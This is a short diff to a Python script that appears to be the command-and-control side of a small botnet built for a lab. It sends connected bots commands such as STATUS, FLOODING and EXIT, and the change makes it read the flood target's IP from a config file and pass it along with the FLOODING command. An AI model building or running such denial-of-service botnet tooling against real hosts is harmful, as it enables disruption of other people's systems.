@@ -1,7 +1,12 @@
 import socket
 import threading
 
-TARGET = '192.168.56.105'#IP Address of Kali Linux target VM
+TARGET = ' '#IP Address of Kali Linux target VM to be read from the config file
+
+with open("Config.txt", 'r') as file:
+	content = file.readline()
+	TARGET = content[16:]
+
 
 def connectbot(clientsocketsource):
 	while True:
@@ -29,7 +34,7 @@ def sendcommands(clientsocketsaddresssource):
 				row.send("STATUS")
 
 			if int(input_get) == 4:
-				row.send("FLOODING")
+				row.send("\t".join(("FLOODING",TARGET)))
 
 			if int(input_get) == 5:
 				row.send("EXIT")
